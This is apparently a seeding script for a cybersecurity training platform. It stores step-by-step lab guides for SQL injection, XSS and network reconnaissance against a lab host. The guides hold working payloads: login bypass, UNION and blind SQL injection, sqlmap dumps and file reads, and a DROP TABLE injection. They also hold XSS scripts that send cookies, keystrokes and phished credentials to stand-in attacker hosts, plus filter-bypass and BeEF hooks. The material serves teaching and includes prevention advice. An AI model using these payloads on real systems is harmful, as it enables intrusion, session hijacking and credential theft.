#!/usr/bin/env python
"""
Populate Challenge Execution Guides
This script adds comprehensive, step-by-step execution guides to existing challenges
so students can easily follow along and learn cybersecurity concepts.
"""

from app import app, db, Challenge

def update_challenges():
    """Update all challenges with comprehensive execution guides."""
    
    with app.app_context():
        # SQL Injection Mastery
        sql_injection = Challenge.query.filter_by(name='SQL Injection Mastery').first()
        if sql_injection:
            sql_injection.how_to_execute = """
# SQL Injection Mastery - Step-by-Step Execution Guide

## Prerequisites
- Access to the vulnerable web application at http://192.168.1.10
- Basic understanding of SQL syntax
- Firefox or Chrome browser with developer tools

## Complete Execution Steps

### Step 1: Identify the Vulnerability
1. Navigate to http://192.168.1.10/login
2. Open browser Developer Tools (Press F12)
3. Go to the "Network" tab
4. Try login with credentials: `admin' OR '1'='1` as username and `password` as password
5. Observe the SQL query in the browser console or network request

**What you'll see:** The login bypasses because SQL becomes `SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='password'`

### Step 2: Basic SQL Injection (UNION-based)
1. Go to the search box at http://192.168.1.10/search
2. Enter: `' UNION SELECT username, password FROM users --`
3. Click Search
4. The database results will show all usernames and passwords

**Command breakdown:**
- `'` - Closes the initial quote
- `UNION SELECT` - Combines results from another query
- `username, password FROM users` - Selects user credentials
- `--` - Comments out the rest of the original query

### Step 3: Determine Number of Columns
1. Try: `' UNION SELECT NULL --`
2. If error, try: `' UNION SELECT NULL, NULL --`
3. Keep adding NULLs until no error appears
4. This tells you how many columns the original query has

**Commands to try in order:**
```
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT NULL, NULL, NULL, NULL --
```

### Step 4: Extract Database Information
1. Use information_schema to find table names:
```
' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database() --
```

2. List all columns in a table:
```
' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users' --
```

### Step 5: Time-based Blind SQL Injection
When UNION doesn't work, use time delays:

1. Go to login page
2. Username field: `admin' AND SLEEP(5) --`
3. If response takes 5 seconds, it's vulnerable
4. If it sleeps, the injection worked!

**Explanation:** If the query is `SELECT * FROM users WHERE username='admin' AND SLEEP(5) --'`, the SLEEP(5) will pause the database.

### Step 6: Boolean-based Blind SQL Injection
1. Username: `admin' AND '1'='1`
2. Should show "Valid username"
3. Try: `admin' AND '1'='2`
4. Should show "Invalid username"
5. Use these true/false responses to extract data character by character

### Step 7: Extract Data Blind
To extract password character by character when UNION doesn't work:

```sql
admin' AND SUBSTRING(password,1,1)='a' --
admin' AND SUBSTRING(password,1,1)='b' --
admin' AND SUBSTRING(password,1,1)='c' --
```

When you get a "Valid" response, that's the correct character!

### Step 8: Using sqlmap (Automated)
Open terminal and run:

```bash
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" --dbs
```

This will:
- Find SQL injection automatically
- List all databases
- Extract tables and data

**More sqlmap commands:**
```bash
# Get all tables
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" -D vulnerable_db --tables

# Extract specific table
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" -D vulnerable_db -T users --dump

# Get database user
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" --current-user

# Read files
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" --file-read="/etc/passwd"
```

## Real-World Scenarios

### Scenario 1: Website Login Bypass
Target: Any login form
Payload: `admin' --`
Result: Logs in as admin without password

### Scenario 2: Data Extraction
Target: Search functionality
Payload: `' OR '1'='1`
Result: Returns all records instead of filtered results

### Scenario 3: Database Manipulation
Target: Any form field
Payload: `'; DROP TABLE users; --`
Result: Could delete the entire users table (destructive!)

## Prevention Methods (For Developers)
1. **Use Prepared Statements**
   ```sql
   SELECT * FROM users WHERE username = ? AND password = ?
   ```

2. **Input Validation**
   - Whitelist allowed characters
   - Reject special characters like `' " ; --`

3. **Escape Special Characters**
   - Use mysqli_real_escape_string() or equivalent

4. **Principle of Least Privilege**
   - Database user should have minimal permissions

## Flag Location
After successfully extracting data, look for the flag in:
- `flags` table with column `flag_sql_injection`
- Or in a user record marked as "admin_flag"

## Summary
SQL Injection occurs when user input is directly concatenated into SQL queries. Always use parameterized queries and validate input.
"""
            db.session.commit()
            print("[OK] Updated: SQL Injection Mastery")

        # XSS Challenge
        xss = Challenge.query.filter_by(name='XSS (Cross-Site Scripting)').first()
        if xss:
            xss.how_to_execute = """
# XSS (Cross-Site Scripting) - Complete Execution Guide

## Prerequisites
- Firefox or Chrome browser
- Developer Tools knowledge (F12)
- Understanding of HTML and JavaScript basics

## Complete Execution Steps

### Step 1: Identify the Vulnerability
1. Go to http://192.168.1.10/profile
2. Click "Edit Profile"
3. In the "About Me" field, enter: `<h1>XSS Test</h1>`
4. Save and view profile
5. If the heading displays (not escaped), it's vulnerable to XSS

### Step 2: Basic Alert Box (Stored XSS)
1. Go to comment section at http://192.168.1.10/post/1
2. In the comment field, paste:
```javascript
<script>alert('XSS Vulnerability Found!');</script>
```
3. Post the comment
4. When the page reloads, an alert box appears
5. This proves JavaScript execution

### Step 3: Cookie Stealing (Session Hijacking)
1. In comment field, paste:
```javascript
<script>
fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
</script>
```
2. This sends the victim's session cookie to attacker's server
3. Attacker can then use that cookie to impersonate the user

**On your test server, use:**
```javascript
<script>
console.log('My cookies: ' + document.cookie);
alert(document.cookie);
</script>
```

### Step 4: Reflected XSS via URL
1. Navigate to: `http://192.168.1.10/search?q=test`
2. The search parameter is reflected in the page
3. Try: `http://192.168.1.10/search?q=<img src=x onerror=alert('XSS')>`
4. If alert appears, reflected XSS confirmed

### Step 5: Event Handler Injection
1. Try in comment field:
```html
<img src=x onerror=alert('XSS via img')>
<svg onload=alert('XSS via svg')>
<body onload=alert('XSS via body')>
<input onfocus=alert('XSS via input') autofocus>
```

2. Each one uses different HTML elements to execute JavaScript

### Step 6: Bypass Filters
If simple `<script>` tags are blocked, try:

```html
<!-- Alternative 1: Event handlers -->
<img src=x onerror=alert('XSS')>

<!-- Alternative 2: Style tags -->
<style>@import'http://attacker.com/xss.css';</style>

<!-- Alternative 3: Case variation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Alternative 4: Encoding -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

<!-- Alternative 5: SVG based -->
<svg><script>alert('XSS')</script></svg>

<!-- Alternative 6: Iframe injection -->
<iframe src="javascript:alert('XSS')"></iframe>
```

### Step 7: Session Stealing (Advanced)
1. Set up a simple server on attacker machine:
```bash
python3 -m http.server 8888
```

2. Inject payload:
```javascript
<script>
new Image().src = 'http://ATTACKER_IP:8888/?c=' + btoa(document.cookie);
</script>
```

3. Check server logs to see encoded cookies

4. Decode with:
```bash
echo "BASE64_STRING" | base64 -d
```

### Step 8: Keylogger Injection
1. Paste in vulnerable field:
```javascript
<script>
document.addEventListener('keypress', function(e) {
    console.log('Key pressed: ' + e.key);
    fetch('http://attacker.com/log?key=' + e.key);
});
</script>
```

2. Now every key the user types is logged

### Step 9: Using Burp Suite (Advanced)
1. Open Burp Suite
2. Set browser proxy to localhost:8080
3. Browse to vulnerable site
4. Right-click request → "Send to Repeater"
5. In Repeater, modify the comment field with XSS payload
6. Send request and observe response

### Step 10: Using BeEF (Browser Exploitation Framework)
1. Start BeEF:
```bash
./beef
```

2. Access at http://localhost:3000
3. Inject BeEF hook:
```javascript
<script src="http://localhost:3000/hook.js"></script>
```

4. BeEF will show connected browsers
5. Run attacks from BeEF console on hooked victims

## Real-World Attack Scenarios

### Scenario 1: Phishing via XSS
Create fake login form and steal credentials:
```html
<script>
document.body.innerHTML = `
<div style="border:1px solid black; padding:20px; width:300px; margin:50px auto;">
  <h2>Session Expired</h2>
  <p>Please login again:</p>
  <form id="phish">
    Username: <input type="text" id="user"><br>
    Password: <input type="password" id="pass"><br>
    <button type="button" onclick="steal()">Login</button>
  </form>
</div>
<script>
function steal() {
  fetch('http://attacker.com/creds.php?u=' + document.getElementById('user').value + 
        '&p=' + document.getElementById('pass').value);
}
</script>
`;
</script>
```

### Scenario 2: Malware Distribution
```javascript
<script>
// Download and execute malware
let img = new Image();
img.src = 'http://attacker.com/malware.exe';
</script>
```

### Scenario 3: Website Defacement
```javascript
<script>
document.body.style.backgroundImage = 'url(http://attacker.com/takeover.jpg)';
document.body.innerHTML = '<h1 style="color:red;">HACKED!</h1>';
</script>
```

## Prevention Methods (For Developers)

### 1. HTML Escaping
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

### 2. Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

### 3. Input Validation
```javascript
// Only allow alphanumeric
if (!/^[a-zA-Z0-9]*$/.test(input)) {
    reject();
}
```

### 4. Use Security Libraries
```javascript
DOMPurify.sanitize(userInput);
```

## Flag Extraction
After successful XSS, extract flag from:
- Admin's browser console
- Stored in window.flag
- Admin's cookies
- Hidden in page source

## Commands Summary
```bash
# Test basic XSS
curl "http://192.168.1.10/search?q=<script>alert('XSS')</script>"

# Test with encoding
curl "http://192.168.1.10/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"

# Start local server for exfiltration
python3 -m http.server 8888
```

## Summary
XSS vulnerabilities allow attackers to inject malicious scripts into web pages. Always sanitize and escape user input on both client and server side.
"""
            db.session.commit()
            print("[OK] Updated: XSS (Cross-Site Scripting)")

        # Network Reconnaissance
        network_recon = Challenge.query.filter_by(name='Network Reconnaissance').first()
        if network_recon:
            network_recon.how_to_execute = """
# Network Reconnaissance - Complete Execution Guide

## Prerequisites
- Linux terminal or Kali Linux
- Basic networking knowledge
- Target network: 192.168.1.0/24
- Tools: nmap, netcat, Wireshark, curl

## Complete Execution Steps

### Step 1: Active Host Discovery
1. Open terminal
2. Use ping sweep to find live hosts:
```bash
nmap -sn 192.168.1.0/24
```

3. Expected output shows IP addresses and MAC addresses of active hosts
4. Note down all live IPs

**What each option means:**
- `-sn`: Ping scan (no port scan)
- `192.168.1.0/24`: Network range (256 IP addresses)

### Step 2: Port Scanning
1. Scan a specific host for open ports:
```bash
nmap -p- 192.168.1.10
```

2. This scans all 65535 ports
3. Look for OPEN ports (common: 22=SSH, 80=HTTP, 443=HTTPS)

**Faster version (common ports only):**
```bash
nmap 192.168.1.10
```

### Step 3: Service Version Detection
1. Detect what services are running:
```bash
nmap -sV 192.168.1.10
```

2. Output shows service names and versions
3. Example: `80/tcp open http Apache httpd 2.4.41`

### Step 4: Operating System Detection
1. Fingerprint the OS:
```bash
nmap -O 192.168.1.10
```

2. Shows estimated operating system (Linux, Windows, etc.)
3. Also shows TCP/IP stack fingerprint

### Step 5: Aggressive Scan (All Information)
1. Combine all scans:
```bash
nmap -A 192.168.1.10
```

2. This includes:
   - Port scanning
   - Service version detection
   - OS detection
   - Script scanning

### Step 6: UDP Scanning
1. Some services use UDP instead of TCP:
```bash
nmap -sU 192.168.1.10
```

2. Common UDP services:
   - 53: DNS
   - 161: SNMP
   - 5353: mDNS

### Step 7: NSE (Nmap Scripting Engine)
1. Run vulnerability checks:
```bash
nmap --script vuln 192.168.1.10
```

2. Specific useful scripts:
```bash
# HTTP service enumeration
nmap --script http-methods 192.168.1.10 -p 80

# Check for SSL vulnerabilities
nmap --script ssl-enum-ciphers -p 443 192.168.1.10

# Detect live hosts and enumerate
nmap --script smb-enum-shares 192.168.1.10
```

### Step 8: Banner Grabbing
1. Connect directly to services and get banners:
```bash
nc -v 192.168.1.10 22
```

2. Press Ctrl+C to exit
3. Banner shows service type and version
4. Example: `SSH-2.0-OpenSSH_7.4`

### Step 9: Web Service Enumeration
1. Scan for web directories:
```bash
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt
```

2. Found directories appear with status codes:
   - 200: OK (directory exists)
   - 403: Forbidden (exists but no access)
   - 404: Not Found

3. You can also try:
```bash
curl -v http://192.168.1.10/admin
curl -v http://192.168.1.10/login
curl -v http://192.168.1.10/api
```

### Step 10: DNS Enumeration
1. Get DNS records:
```bash
nslookup 192.168.1.10
dig 192.168.1.10
```

2. DNS transfer attempt:
```bash
dig @192.168.1.10 axfr
```

3. This attempts zone transfer (usually blocked)

### Step 11: Traceroute Analysis
1. Trace network path to target:
```bash
traceroute 192.168.1.10
```

2. Shows all hops (routers) between you and target
3. Helps identify network topology

### Step 12: Packet Capture with Tcpdump
1. Capture all network traffic:
```bash
sudo tcpdump -i eth0 -n
```

2. Capture specific protocol:
```bash
sudo tcpdump -i eth0 -n tcp port 80
```

3. Save to file:
```bash
sudo tcpdump -i eth0 -n -w capture.pcap
```

### Step 13: Wireshark Analysis
1. Open Wireshark:
```bash
sudo wireshark
```

2. Select network interface
3. Start capture
4. Browse to target website or perform activity
5. Stop capture
6. Filter by protocol: `tcp.port == 80`
7. Analyze HTTP requests and responses

### Step 14: Complete Automated Scan
1. Run full reconnaissance:
```bash
nmap -A -T4 -p- 192.168.1.10 -oN scan_results.txt
```

2. Options explained:
   - `-A`: Aggressive (all info)
   - `-T4`: Timing (fast)
   - `-p-`: All ports
   - `-oN`: Output to file

3. View results:
```bash
cat scan_results.txt
```

### Step 15: Export and Analyze Results
1. Export to XML for further analysis:
```bash
nmap -A 192.168.1.10 -oX scan_results.xml
```

2. Convert to HTML:
```bash
nmap -A 192.168.1.10 -oH scan_results.html
```

3. View in browser for better visualization

## Real-World Reconnaissance Example

### Complete Target Assessment:
```bash
# Step 1: Discover the target
nmap -sn 192.168.1.0/24

# Step 2: Get basic info
nmap -sV 192.168.1.10

# Step 3: Enumerate all services
nmap -A -p- 192.168.1.10

# Step 4: Check for vulnerabilities
nmap --script vuln 192.168.1.10

# Step 5: Web service details
nmap --script http-title 192.168.1.10 -p 80

# Step 6: Banner grab SSH
nc 192.168.1.10 22

# Step 7: DNS info
nslookup 192.168.1.10

# Step 8: Detailed report
nmap -A -T4 -p- 192.168.1.10 -oA detailed_scan
```

## Information Gathering Tools

| Tool | Purpose | Command |
|------|---------|---------|
| nmap | Port scanning | `nmap -A target` |
| masscan | Fast port scanner | `masscan -p0-65535 target` |
| hping3 | Custom packets | `hping3 -S target -p 80` |
| netcat | Banner grab | `nc -v target port` |
| shodan | Internet search | `shodan search http` |
| dig | DNS lookup | `dig @dns target` |
| whois | Domain info | `whois domain.com` |
| curl | Web requests | `curl -v http://target` |

## Flag Location
After reconnaissance, look for:
- Service banners containing version info
- Hidden directories found by gobuster
- DNS records with information
- Comment in HTTP headers
- Flag in `/hidden` or `/flag` directories

## Summary
Network reconnaissance gathers information about target systems. Always use with permission and document findings.
"""
            db.session.commit()
            print("[OK] Updated: Network Reconnaissance")

        print("\n" + "="*50)
        print("All challenges updated with comprehensive guides!")
        print("="*50)
        print("\nGuides include:")
        print("[OK] Step-by-step instructions")
        print("[OK] Complete commands to copy and paste")
        print("[OK] Explanations of each step")
        print("[OK] Real-world scenarios")
        print("[OK] Prevention methods")
        print("[OK] Summary of concepts")

if __name__ == '__main__':
    update_challenges()
